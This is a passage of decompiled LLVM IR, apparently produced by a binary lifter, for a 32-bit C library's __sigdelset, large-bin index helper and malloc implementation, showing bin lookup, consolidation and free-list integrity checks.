define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80533ce = add i32 %arg2, -1
  %v1_80533d1 = urem i32 %v1_80533ce, 32
  %v2_80533d1 = icmp eq i32 %v1_80533d1, 0
  %v2_80533d4 = udiv i32 %v1_80533ce, 32
  br i1 %v2_80533d1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_80533d7 = shl i32 -2, %v1_80533d1
  %v5_80533d7 = sub nsw i32 32, %v1_80533d1
  %v6_80533d7 = lshr i32 -2, %v5_80533d7
  %v7_80533d7 = or i32 %v6_80533d7, %v4_80533d7
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80533d9 = phi i32 [ -2, %entry ], [ %v7_80533d7, %bb ]
  %v2_80533d9 = mul nuw nsw i32 %v2_80533d4, 4
  %v3_80533d9 = add i32 %v2_80533d9, %arg1
  %v4_80533d9 = inttoptr i32 %v3_80533d9 to i32*
  %v5_80533d9 = load i32, i32* %v4_80533d9, align 4
  %v7_80533d9 = and i32 %v5_80533d9, %v6_80533d9
  store i32 %v7_80533d9, i32* %v4_80533d9, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80533d1, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80533e0 = load i32, i32* @eax, align 4
  %v6_80533f3 = icmp ugt i32 %v0_80533e0, 16777215
  br i1 %v6_80533f3, label %dec_label_pc_8053404, label %dec_label_pc_80533f5

dec_label_pc_80533f5:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80533e0, 256
  %v2_80533e3 = udiv i32 %v0_80533e0, 256
  %v2_80533f5 = call i32 @llvm.ctlz.i32(i32 %v2_80533e3, i1 true)
  %v3_80533f5 = xor i32 %v2_80533f5, 31
  %v5_80533f5 = select i1 %tmp, i32 95, i32 %v3_80533f5
  %v1_80533f8 = add nuw nsw i32 %v5_80533f5, 6
  store i32 %v1_80533f8, i32* @ecx, align 4
  %v2_80533fb = urem i32 %v1_80533f8, 32
  %v4_80533fb = icmp eq i32 %v2_80533fb, 0
  br i1 %v4_80533fb, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_80533f5
  %v5_80533fb = lshr i32 %v0_80533e0, %v2_80533fb
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80533f5, %bb
  %v0_80533fd = phi i32 [ %v0_80533e0, %dec_label_pc_80533f5 ], [ %v5_80533fb, %bb ]
  %v1_80533fd = urem i32 %v0_80533fd, 4
  %v2_8053400 = mul nuw nsw i32 %v5_80533f5, 4
  %v3_8053400 = or i32 %v1_80533fd, 32
  %v4_8053400 = add nuw nsw i32 %v3_8053400, %v2_8053400
  br label %dec_label_pc_8053404

dec_label_pc_8053404:                             ; preds = %entry, %bb4
  %v0_8053405 = phi i32 [ 95, %entry ], [ %v4_8053400, %bb4 ]
  ret i32 %v0_8053405

; uselistorder directives
  uselistorder i32 %v2_80533fb, { 1, 0 }
  uselistorder i32 %v0_80533e0, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8053404, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053406 = load i32, i32* @ebp, align 4
  %v0_8053407 = load i32, i32* @edi, align 4
  %v0_8053408 = load i32, i32* @esi, align 4
  %v0_8053409 = load i32, i32* @ebx, align 4
  store i32 %v0_8053409, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805341b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805341b, i32* @eax, align 4
  store i32 %v2_805341b, i32* %stack_var_-92, align 4
  %v2_8053420 = call i32 @__pthread_return_void(i32 %v2_805341b, i32 134564459)
  store i32 %v2_8053420, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d330.522 to i32), i32* %stack_var_-92, align 4
  %v1_805342c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d330.522 to i32))
  store i32 %v1_805342c, i32* %eax.global-to-local, align 4
  %v0_8053434 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8053434, -32
  br i1 %tmp125, label %dec_label_pc_805344b, label %dec_label_pc_8053439

dec_label_pc_8053439:                             ; preds = %entry
  %v0_8053439 = load i32, i32* %stack_var_-92, align 4
  %v1_8053439 = call i32 @__errno_location(i32 %v0_8053439)
  store i32 %v1_8053439, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053440 = inttoptr i32 %v1_8053439 to i32*
  store i32 12, i32* %v1_8053440, align 4
  br label %dec_label_pc_8053b70

dec_label_pc_805344b:                             ; preds = %entry
  %v1_805344b = add i32 %v0_8053434, 11
  %tmp126 = icmp ult i32 %v1_805344b, 16
  br i1 %tmp126, label %dec_label_pc_8053462, label %dec_label_pc_805345b

dec_label_pc_805345b:                             ; preds = %dec_label_pc_805344b
  %v1_805345b = and i32 %v1_805344b, -8
  br label %dec_label_pc_8053462

dec_label_pc_8053462:                             ; preds = %dec_label_pc_805344b, %dec_label_pc_805345b
  %storemerge136 = phi i32 [ %v1_805345b, %dec_label_pc_805345b ], [ %v1_805344b, %dec_label_pc_805344b ]
  %v1_80537fa = phi i32 [ %v1_805345b, %dec_label_pc_805345b ], [ 16, %dec_label_pc_805344b ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_8053462 = load i8, i8* @global_var_80637a0.523, align 1
  %v1_8053462 = sext i8 %v0_8053462 to i32
  store i32 %v1_8053462, i32* @ebx, align 4
  %v3_8053468 = urem i8 %v0_8053462, 2
  %v4_8053468 = icmp eq i8 %v3_8053468, 0
  %v1_805346b = icmp eq i1 %v4_8053468, false
  br i1 %v1_805346b, label %dec_label_pc_805348a, label %dec_label_pc_805346d

dec_label_pc_805346d:                             ; preds = %dec_label_pc_8053462
  %v2_805346d = icmp eq i8 %v0_8053462, 0
  %v1_805346f = icmp eq i1 %v2_805346d, false
  br i1 %v1_805346f, label %dec_label_pc_8053765, label %dec_label_pc_8053475

dec_label_pc_8053475:                             ; preds = %dec_label_pc_805346d
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* %stack_var_-92, align 4
  %v2_805347d = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80637a0.523 to i32*))
  store i32 %v2_805347d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053765

dec_label_pc_805348a:                             ; preds = %dec_label_pc_8053462
  %v11_805348a = trunc i32 %v1_80537fa to i8
  %v8_805348e = icmp ugt i8 %v11_805348a, %v0_8053462
  br i1 %v8_805348e, label %dec_label_pc_80534ab, label %dec_label_pc_8053490

dec_label_pc_8053490:                             ; preds = %dec_label_pc_805348a
  %v2_8053494 = udiv i32 %v1_80537fa, 2
  store i32 %v2_8053494, i32* %eax.global-to-local, align 4
  %v1_8053496 = add i32 %v2_8053494, ptrtoint (i8* @global_var_80637a0.523 to i32)
  store i32 %v1_8053496, i32* @ecx, align 4
  %v1_805349c = add i32 %v2_8053494, add (i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32 -4)
  %v2_805349c = inttoptr i32 %v1_805349c to i32*
  %v3_805349c = load i32, i32* %v2_805349c, align 4
  store i32 %v3_805349c, i32* @edx, align 4
  %v1_805349f = icmp eq i32 %v3_805349c, 0
  br i1 %v1_805349f, label %dec_label_pc_80534ab, label %dec_label_pc_80534a3

dec_label_pc_80534a3:                             ; preds = %dec_label_pc_8053490
  %v1_80534a3 = add i32 %v3_805349c, 8
  %v2_80534a3 = inttoptr i32 %v1_80534a3 to i32*
  %v3_80534a3 = load i32, i32* %v2_80534a3, align 4
  store i32 %v3_80534a3, i32* %eax.global-to-local, align 4
  store i32 %v3_80534a3, i32* %v2_805349c, align 4
  br label %dec_label_pc_80534e4

dec_label_pc_80534ab:                             ; preds = %dec_label_pc_8053490, %dec_label_pc_805348a
  %v8_80534ab = icmp ult i32 %v1_80537fa, 255
  %v6_80534b3 = icmp ugt i32 %v1_80537fa, 255
  store i32 %v1_80537fa, i32* @eax, align 4
  br i1 %v6_80534b3, label %dec_label_pc_80534ec, label %dec_label_pc_80534b5

dec_label_pc_80534b5:                             ; preds = %dec_label_pc_80534ab
  %v2_80534b9 = udiv i32 %v1_80537fa, 8
  store i32 %v2_80534b9, i32* %eax.global-to-local, align 4
  %v1_80534c0 = mul nuw i32 %v2_80534b9, 8
  %v2_80534c0 = add i32 %v1_80534c0, ptrtoint (i32* @global_var_80637cc.524 to i32)
  store i32 %v2_80534c0, i32* @ecx, align 4
  %v1_80534c7 = add i32 %v1_80534c0, add (i32 ptrtoint (i32* @global_var_80637cc.524 to i32), i32 12)
  %v2_80534c7 = inttoptr i32 %v1_80534c7 to i32*
  %v3_80534c7 = load i32, i32* %v2_80534c7, align 4
  store i32 %v3_80534c7, i32* @edx, align 4
  %v12_80534ca = icmp eq i32 %v3_80534c7, %v2_80534c0
  br i1 %v12_80534ca, label %dec_label_pc_80535e8.preheader, label %dec_label_pc_80534d2

dec_label_pc_80534d2:                             ; preds = %dec_label_pc_80534b5
  store i32 %v1_80537fa, i32* %ebx.global-to-local, align 4
  %v1_80534d6 = add i32 %v3_80534c7, 12
  %v2_80534d6 = inttoptr i32 %v1_80534d6 to i32*
  %v3_80534d6 = load i32, i32* %v2_80534d6, align 4
  store i32 %v3_80534d6, i32* %eax.global-to-local, align 4
  store i32 %v3_80534d6, i32* %v2_80534c7, align 4
  %v0_80534dc = load i32, i32* @edx, align 4
  %v1_80534dc = load i32, i32* %ebx.global-to-local, align 4
  %v2_80534dc = add i32 %v0_80534dc, 4
  %v3_80534dc = add i32 %v2_80534dc, %v1_80534dc
  %v4_80534dc = inttoptr i32 %v3_80534dc to i32*
  %v5_80534dc = load i32, i32* %v4_80534dc, align 4
  %v6_80534dc = or i32 %v5_80534dc, 1
  store i32 %v6_80534dc, i32* %v4_80534dc, align 4
  %v0_80534e1 = load i32, i32* @ecx, align 4
  %v1_80534e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80534e1 = add i32 %v1_80534e1, 8
  %v3_80534e1 = inttoptr i32 %v2_80534e1 to i32*
  store i32 %v0_80534e1, i32* %v3_80534e1, align 4
  br label %dec_label_pc_80534e4

dec_label_pc_80534e4:                             ; preds = %dec_label_pc_8053881, %dec_label_pc_8053893, %dec_label_pc_80534a3, %dec_label_pc_80534d2
  %v0_80534e4 = load i32, i32* @edx, align 4
  %v1_80534e4 = add i32 %v0_80534e4, 8
  store i32 %v1_80534e4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053b5f

dec_label_pc_80534ec:                             ; preds = %dec_label_pc_80534ab
  %v0_80534f0 = call i32 @__malloc_largebin_index()
  store i32 %v0_80534f0, i32* %eax.global-to-local, align 4
  %v3_80534f5 = and i8 %v0_8053462, 2
  %v4_80534f5 = icmp eq i8 %v3_80534f5, 0
  %v6_80534f5 = zext i8 %v3_80534f5 to i32
  %v9_80534f5 = and i32 %v1_8053462, -256
  %v10_80534f5 = or i32 %v9_80534f5, %v6_80534f5
  store i32 %v10_80534f5, i32* @ebx, align 4
  br i1 %v4_80534f5, label %dec_label_pc_80535e8.preheader, label %dec_label_pc_8053502

dec_label_pc_8053502:                             ; preds = %dec_label_pc_80534ec
  store i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32* %stack_var_-92, align 4
  %v2_805350a = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80637a0.523 to i32*))
  store i32 %v2_805350a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535e8.preheader

dec_label_pc_80535e8.preheader:                   ; preds = %dec_label_pc_8053502, %dec_label_pc_80534b5, %dec_label_pc_80534ec
  %stack_var_-40.0.ph = phi i32 [ %v2_80534b9, %dec_label_pc_80534b5 ], [ %v0_80534f0, %dec_label_pc_8053502 ], [ %v0_80534f0, %dec_label_pc_80534ec ]
  %v1_805353e = add i32 %v1_80537fa, 16
  %v0_80535e8107 = load i32, i32* @global_var_80637e0.527, align 32
  store i32 %v0_80535e8107, i32* @ebp, align 4
  %v9_80535ee109 = icmp eq i32 %v0_80535e8107, 134625236
  %v1_80535f4110 = icmp eq i1 %v9_80535ee109, false
  br i1 %v1_80535f4110, label %dec_label_pc_8053517, label %dec_label_pc_80535fa

dec_label_pc_8053517:                             ; preds = %dec_label_pc_80535e8.preheader, %bb84
  %v0_80535e8111 = phi i32 [ %v0_80535e8, %bb84 ], [ %v0_80535e8107, %dec_label_pc_80535e8.preheader ]
  %v1_8053517 = add i32 %v0_80535e8111, 4
  %v2_8053517 = inttoptr i32 %v1_8053517 to i32*
  %v3_8053517 = load i32, i32* %v2_8053517, align 4
  %v1_805351a = add i32 %v0_80535e8111, 12
  %v2_805351a = inttoptr i32 %v1_805351a to i32*
  %v3_805351a = load i32, i32* %v2_805351a, align 4
  store i32 %v3_805351a, i32* @edx, align 4
  %v1_805351d = and i32 %v3_8053517, -4
  store i32 %v1_805351d, i32* @edi, align 4
  br i1 %v6_80534b3, label %dec_label_pc_8053549, label %dec_label_pc_805352a

dec_label_pc_805352a:                             ; preds = %dec_label_pc_8053517
  %v9_805352a = icmp eq i32 %v3_805351a, 134625236
  %v1_8053530 = icmp eq i1 %v9_805352a, false
  br i1 %v1_8053530, label %dec_label_pc_8053549, label %dec_label_pc_8053532

dec_label_pc_8053532:                             ; preds = %dec_label_pc_805352a
  %v1_8053532 = load i32, i32* @global_var_80637d0.525, align 16
  %v12_8053532 = icmp eq i32 %v0_80535e8111, %v1_8053532
  %v1_8053538 = icmp eq i1 %v12_8053532, false
  br i1 %v1_8053538, label %dec_label_pc_8053549, label %dec_label_pc_805353a

dec_label_pc_805353a:                             ; preds = %dec_label_pc_8053532
  store i32 %v1_805353e, i32* %eax.global-to-local, align 4
  %v6_8053543 = icmp ugt i32 %v1_805351d, %v1_805353e
  br i1 %v6_8053543, label %dec_label_pc_8053afa, label %dec_label_pc_8053549

dec_label_pc_8053549:                             ; preds = %dec_label_pc_805353a, %dec_label_pc_8053532, %dec_label_pc_805352a, %dec_label_pc_8053517
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %eax.global-to-local, align 4
  %v2_805354e = add i32 %v3_805351a, 8
  %v3_805354e = inttoptr i32 %v2_805354e to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v3_805354e, align 4
  %v0_8053551 = load i32, i32* @edx, align 4
  store i32 %v0_8053551, i32* @global_var_80637e0.527, align 4
  %v0_8053554 = load i32, i32* @edi, align 4
  %v15_8053554 = icmp eq i32 %v0_8053554, %v1_80537fa
  br i1 %v15_8053554, label %dec_label_pc_8053b3b, label %dec_label_pc_805355e

dec_label_pc_805355e:                             ; preds = %dec_label_pc_8053549
  %v6_8053564 = icmp ugt i32 %v0_8053554, 255
  br i1 %v6_8053564, label %dec_label_pc_8053577, label %dec_label_pc_8053566

dec_label_pc_8053566:                             ; preds = %dec_label_pc_805355e
  %v2_8053568 = udiv i32 %v0_8053554, 8
  store i32 %v2_8053568, i32* %esi.global-to-local, align 4
  %v1_805356b = mul nuw i32 %v2_8053568, 8
  %v2_805356b = add i32 %v1_805356b, 134625228
  store i32 %v2_805356b, i32* @ebx, align 4
  %v1_8053572 = add i32 %v1_805356b, 134625236
  %v2_8053572 = inttoptr i32 %v1_8053572 to i32*
  %v3_8053572 = load i32, i32* %v2_8053572, align 4
  store i32 %v3_8053572, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535c0

dec_label_pc_8053577:                             ; preds = %dec_label_pc_805355e
  store i32 %v0_8053554, i32* @eax, align 4
  %v0_8053579 = call i32 @__malloc_largebin_index()
  store i32 %v0_8053579, i32* %esi.global-to-local, align 4
  %v1_8053580 = mul i32 %v0_8053579, 8
  %v2_8053580 = add i32 %v1_8053580, ptrtoint (i32* @global_var_80637cc.524 to i32)
  store i32 %v2_8053580, i32* %eax.global-to-local, align 4
  %v1_8053587 = add i32 %v1_8053580, add (i32 ptrtoint (i32* @global_var_80637cc.524 to i32), i32 8)
  %v2_8053587 = inttoptr i32 %v1_8053587 to i32*
  %v3_8053587 = load i32, i32* %v2_8053587, align 4
  store i32 %v3_8053587, i32* %edx.global-to-local, align 4
  store i32 %v3_8053587, i32* @ebx, align 4
  %v12_8053590 = icmp eq i32 %v3_8053587, %v2_8053580
  br i1 %v12_8053590, label %dec_label_pc_80535c0, label %dec_label_pc_8053594

dec_label_pc_8053594:                             ; preds = %dec_label_pc_8053577
  %v1_8053594 = add i32 %v1_8053580, add (i32 ptrtoint (i32* @global_var_80637cc.524 to i32), i32 12)
  %v2_8053594 = inttoptr i32 %v1_8053594 to i32*
  %v3_8053594 = load i32, i32* %v2_8053594, align 4
  store i32 %v3_8053594, i32* @ebx, align 4
  %v0_8053597 = load i32, i32* @edi, align 4
  %v2_8053597 = add i32 %v3_8053594, 4
  %v3_8053597 = inttoptr i32 %v2_8053597 to i32*
  %v4_8053597 = load i32, i32* %v3_8053597, align 4
  %v10_8053597 = icmp ult i32 %v0_8053597, %v4_8053597
  %v1_805359a = icmp eq i1 %v10_8053597, false
  br i1 %v1_805359a, label %dec_label_pc_80535a2, label %dec_label_pc_80535c0

dec_label_pc_80535a2:                             ; preds = %dec_label_pc_8053594
  %v1_80535a4 = or i32 %v0_8053597, 1
  store i32 %v1_80535a4, i32* %eax.global-to-local, align 4
  store i32 %v3_8053587, i32* %ebx.global-to-local, align 4
  %v2_80535b8101 = add i32 %v3_8053587, 4
  %v3_80535b8102 = inttoptr i32 %v2_80535b8101 to i32*
  %v4_80535b8103 = load i32, i32* %v3_80535b8102, align 4
  %v10_80535b8104 = icmp ult i32 %v1_80535a4, %v4_80535b8103
  br i1 %v10_80535b8104, label %dec_label_pc_80535a9, label %dec_label_pc_80535bd

dec_label_pc_80535a9:                             ; preds = %dec_label_pc_80535a2, %dec_label_pc_80535a9
  %v0_80535bd105 = phi i32 [ %v3_80535ad, %dec_label_pc_80535a9 ], [ %v3_8053587, %dec_label_pc_80535a2 ]
  store i32 %v0_80535bd105, i32* %ecx.global-to-local, align 4
  %v1_80535ad = add i32 %v0_80535bd105, 8
  %v2_80535ad = inttoptr i32 %v1_80535ad to i32*
  %v3_80535ad = load i32, i32* %v2_80535ad, align 4
  store i32 %v3_80535ad, i32* %ecx.global-to-local, align 4
  store i32 %v3_80535ad, i32* %ebx.global-to-local, align 4
  %v2_80535b8 = add i32 %v3_80535ad, 4
  %v3_80535b8 = inttoptr i32 %v2_80535b8 to i32*
  %v4_80535b8 = load i32, i32* %v3_80535b8, align 4
  %v10_80535b8 = icmp ult i32 %v1_80535a4, %v4_80535b8
  br i1 %v10_80535b8, label %dec_label_pc_80535a9, label %dec_label_pc_80535bd

dec_label_pc_80535bd:                             ; preds = %dec_label_pc_80535a9, %dec_label_pc_80535a2
  %v0_80535bd.lcssa = phi i32 [ %v3_8053587, %dec_label_pc_80535a2 ], [ %v3_80535ad, %dec_label_pc_80535a9 ]
  %v1_80535bd = add i32 %v0_80535bd.lcssa, 12
  %v2_80535bd = inttoptr i32 %v1_80535bd to i32*
  %v3_80535bd = load i32, i32* %v2_80535bd, align 4
  store i32 %v3_80535bd, i32* @ebx, align 4
  br label %dec_label_pc_80535c0

dec_label_pc_80535c0:                             ; preds = %dec_label_pc_8053566, %dec_label_pc_8053594, %dec_label_pc_8053577, %dec_label_pc_80535bd
  %v0_80535c0 = phi i32 [ %v0_8053579, %dec_label_pc_8053577 ], [ %v0_8053579, %dec_label_pc_80535bd ], [ %v0_8053579, %dec_label_pc_8053594 ], [ %v2_8053568, %dec_label_pc_8053566 ]
  %stack_var_-64.1 = phi i32 [ %v2_8053580, %dec_label_pc_8053577 ], [ %v0_80535bd.lcssa, %dec_label_pc_80535bd ], [ %v2_8053580, %dec_label_pc_8053594 ], [ %v3_8053572, %dec_label_pc_8053566 ]
  %v1_80535c2 = urem i32 %v0_80535c0, 32
  %v2_80535c2 = icmp eq i32 %v1_80535c2, 0
  store i32 %v1_80535c2, i32* %esi.global-to-local, align 4
  store i32 %v1_80535c2, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_80535cc = sdiv i32 %v0_80535c0, 32
  store i32 %v2_80535cc, i32* %edx.global-to-local, align 4
  br i1 %v2_80535c2, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_80535c0
  %v5_80535cf = shl i32 1, %v1_80535c2
  store i32 %v5_80535cf, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_80535c0, %bb
  %v5_80535d1 = phi i32 [ 1, %dec_label_pc_80535c0 ], [ %v5_80535cf, %bb ]
  %v1_80535d1 = mul nsw i32 %v2_80535cc, 4
  %v2_80535d1 = add i32 %v1_80535d1, ptrtoint (i32* @global_var_8063ad4.528 to i32)
  %v3_80535d1 = inttoptr i32 %v2_80535d1 to i32*
  %v4_80535d1 = load i32, i32* %v3_80535d1, align 4
  %v6_80535d1 = or i32 %v4_80535d1, %v5_80535d1
  store i32 %v6_80535d1, i32* %v3_80535d1, align 4
  %v0_80535d8 = load i32, i32* @ebx, align 4
  %v1_80535d8 = load i32, i32* @ebp, align 4
  %v2_80535d8 = add i32 %v1_80535d8, 12
  %v3_80535d8 = inttoptr i32 %v2_80535d8 to i32*
  store i32 %v0_80535d8, i32* %v3_80535d8, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_80535df = load i32, i32* @ebp, align 4
  %v2_80535df = add i32 %v1_80535df, 8
  %v3_80535df = inttoptr i32 %v2_80535df to i32*
  store i32 %stack_var_-64.1, i32* %v3_80535df, align 4
  %v0_80535e2 = load i32, i32* @ebp, align 4
  %v1_80535e2 = load i32, i32* @ebx, align 4
  %v2_80535e2 = add i32 %v1_80535e2, 8
  %v3_80535e2 = inttoptr i32 %v2_80535e2 to i32*
  store i32 %v0_80535e2, i32* %v3_80535e2, align 4
  %v0_80535e5 = load i32, i32* @ebp, align 4
  %v1_80535e5 = load i32, i32* @esi, align 4
  %v2_80535e5 = add i32 %v1_80535e5, 12
  %v3_80535e5 = inttoptr i32 %v2_80535e5 to i32*
  store i32 %v0_80535e5, i32* %v3_80535e5, align 4
  %v0_80535e8 = load i32, i32* @global_var_80637e0.527, align 32
  store i32 %v0_80535e8, i32* @ebp, align 4
  %v9_80535ee = icmp eq i32 %v0_80535e8, 134625236
  %v1_80535f4 = icmp eq i1 %v9_80535ee, false
  br i1 %v1_80535f4, label %dec_label_pc_8053517, label %dec_label_pc_80535fa

dec_label_pc_80535fa:                             ; preds = %bb84, %dec_label_pc_80535e8.preheader
  br i1 %v8_80534ab, label %dec_label_pc_8053688, label %dec_label_pc_8053608

dec_label_pc_8053608:                             ; preds = %dec_label_pc_80535fa
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805360c = mul i32 %stack_var_-40.0.ph, 8
  %v2_805360c = add i32 %v1_805360c, ptrtoint (i32* @global_var_80637cc.524 to i32)
  store i32 %v2_805360c, i32* %edx.global-to-local, align 4
  %v1_8053613 = add i32 %v1_805360c, add (i32 ptrtoint (i32* @global_var_80637cc.524 to i32), i32 12)
  %v2_8053613 = inttoptr i32 %v1_8053613 to i32*
  %storemerge1.pre = load i32, i32* %v2_8053613, align 4
  br label %dec_label_pc_8053684

dec_label_pc_8053618:                             ; preds = %dec_label_pc_8053684
  %v1_8053618 = add i32 %v4_805362f, 4
  %v2_8053618 = inttoptr i32 %v1_8053618 to i32*
  %v3_8053618 = load i32, i32* %v2_8053618, align 4
  store i32 %v3_8053618, i32* %ebx.global-to-local, align 4
  %v1_805361b = add i32 %v4_805362f, 12
  %v2_805361b = inttoptr i32 %v1_805361b to i32*
  %v3_805361b = load i32, i32* %v2_805361b, align 4
  store i32 %v3_805361b, i32* @ecx, align 4
  %v1_805361e = and i32 %v3_8053618, -4
  store i32 %v1_805361e, i32* @ebx, align 4
  %v10_8053621 = icmp ult i32 %v1_805361e, %v1_80537fa
  br i1 %v10_8053621, label %dec_label_pc_8053684, label %dec_label_pc_8053627

dec_label_pc_8053627:                             ; preds = %dec_label_pc_8053618
  %v1_8053627 = add i32 %v4_805362f, 8
  %v2_8053627 = inttoptr i32 %v1_8053627 to i32*
  %v3_8053627 = load i32, i32* %v2_8053627, align 4
  store i32 %v3_8053627, i32* @edx, align 4
  %v1_805362a = add i32 %v3_8053627, 12
  %v2_805362a = inttoptr i32 %v1_805362a to i32*
  %v3_805362a = load i32, i32* %v2_805362a, align 4
  %v15_805362a = icmp eq i32 %v3_805362a, %v4_805362f
  %v1_805362d = icmp eq i1 %v15_805362a, false
  br i1 %v1_805362d, label %dec_label_pc_8053634, label %dec_label_pc_805362f

dec_label_pc_805362f:                             ; preds = %dec_label_pc_8053627
  %v1_805362f = add i32 %v3_805361b, 8
  %v2_805362f = inttoptr i32 %v1_805362f to i32*
  %v3_805362f = load i32, i32* %v2_805362f, align 4
  %v15_805362f = icmp eq i32 %v3_805362f, %v4_805362f
  br i1 %v15_805362f, label %dec_label_pc_8053639, label %dec_label_pc_8053634

dec_label_pc_8053634:                             ; preds = %dec_label_pc_805362f, %dec_label_pc_8053627
  %v0_8053634 = call i32 @abort()
  store i32 %v0_8053634, i32* %eax.global-to-local, align 4
  %v0_8053639.pre = load i32, i32* @ebx, align 4
  %v0_805363f.pre = load i32, i32* @ecx, align 4
  %v1_805363f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053639

dec_label_pc_8053639:                             ; preds = %dec_label_pc_805362f, %dec_label_pc_8053634
  %v1_805363f = phi i32 [ %v3_8053627, %dec_label_pc_805362f ], [ %v1_805363f.pre, %dec_label_pc_8053634 ]
  %v0_805363f = phi i32 [ %v3_805361b, %dec_label_pc_805362f ], [ %v0_805363f.pre, %dec_label_pc_8053634 ]
  %v0_8053639 = phi i32 [ %v1_805361e, %dec_label_pc_805362f ], [ %v0_8053639.pre, %dec_label_pc_8053634 ]
  %v5_805363b = sub i32 %v0_8053639, %v1_80537fa
  store i32 %v5_805363b, i32* %esi.global-to-local, align 4
  %v2_805363f = add i32 %v1_805363f, 12
  %v3_805363f = inttoptr i32 %v2_805363f to i32*
  store i32 %v0_805363f, i32* %v3_805363f, align 4
  %v0_8053642 = load i32, i32* @edx, align 4
  %v1_8053642 = load i32, i32* @ecx, align 4
  %v2_8053642 = add i32 %v1_8053642, 8
  %v3_8053642 = inttoptr i32 %v2_8053642 to i32*
  store i32 %v0_8053642, i32* %v3_8053642, align 4
  %v0_8053645 = load i32, i32* %esi.global-to-local, align 4
  %v0_8053648 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053648 = add i32 %v0_8053648, 8
  store i32 %v1_8053648, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_8053645, 16
  br i1 %tmp127, label %dec_label_pc_8053b49, label %dec_label_pc_8053651

dec_label_pc_8053651:                             ; preds = %dec_label_pc_8053639
  %v2_8053655 = add i32 %v0_8053648, %v1_80537fa
  store i32 %v2_8053655, i32* @edx, align 4
  %v1_8053658 = or i32 %v1_80537fa, 1
  store i32 %v1_8053658, i32* %ebx.global-to-local, align 4
  %v2_805365b = add i32 %v0_8053648, 4
  %v3_805365b = inttoptr i32 %v2_805365b to i32*
  store i32 %v1_8053658, i32* %v3_805365b, align 4
  %v0_805365e = load i32, i32* %esi.global-to-local, align 4
  %v1_8053660 = or i32 %v0_805365e, 1
  store i32 %v1_8053660, i32* %eax.global-to-local, align 4
  %v0_8053663 = load i32, i32* @edx, align 4
  %v1_8053663 = load i32, i32* @ebp, align 4
  %v2_8053663 = add i32 %v1_8053663, 8
  %v3_8053663 = inttoptr i32 %v2_8053663 to i32*
  store i32 %v0_8053663, i32* %v3_8053663, align 4
  %v0_8053666 = load i32, i32* @edx, align 4
  %v1_8053666 = load i32, i32* @ebp, align 4
  %v2_8053666 = add i32 %v1_8053666, 12
  %v3_8053666 = inttoptr i32 %v2_8053666 to i32*
  store i32 %v0_8053666, i32* %v3_8053666, align 4
  %v0_8053669 = load i32, i32* @edx, align 4
  %v1_8053669 = add i32 %v0_8053669, 8
  %v2_8053669 = inttoptr i32 %v1_8053669 to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053669, align 4
  %v0_8053670 = load i32, i32* @edx, align 4
  %v1_8053670 = add i32 %v0_8053670, 12
  %v2_8053670 = inttoptr i32 %v1_8053670 to i32*
  store i32 ptrtoint (i32* @global_var_80637d4.526 to i32), i32* %v2_8053670, align 4
  %v0_8053677 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053677 = load i32, i32* @edx, align 4
  %v2_8053677 = add i32 %v1_8053677, 4
  %v3_8053677 = inttoptr i32 %v2_8053677 to i32*
  store i32 %v0_8053677, i32* %v3_8053677, align 4
  %v0_805367a = load i32, i32* %esi.global-to-local, align 4
  %v1_805367a = load i32, i32* @edx, align 4
  %v3_805367a = add i32 %v1_805367a, %v0_805367a
  %v4_805367a = inttoptr i32 %v3_805367a to i32*
  store i32 %v0_805367a, i32* %v4_805367a, align 4
  br label %dec_label_pc_8053b4e

dec_label_pc_8053684:                             ; preds = %dec_label_pc_8053618, %dec_label_pc_8053608
